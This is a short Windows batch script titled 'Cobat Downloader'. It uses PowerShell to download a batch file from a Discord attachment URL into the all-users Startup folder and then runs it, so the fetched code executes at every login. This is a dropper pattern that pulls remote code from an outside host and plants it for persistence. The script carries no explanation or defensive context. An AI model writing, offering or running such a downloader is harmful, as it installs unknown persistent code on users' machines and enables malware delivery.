@echo off
Title Cobat Downloader & Color 5
powershell -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1284063427215626323/1284063476314275860/Cobat.bat?ex=66e544cd&is=66e3f34d&hm=4ab00c64c1e2f2e9992552a4df2869397f6799825d3970c0f46adcb8cbefabf3&' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat.bat'"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Cobat.bat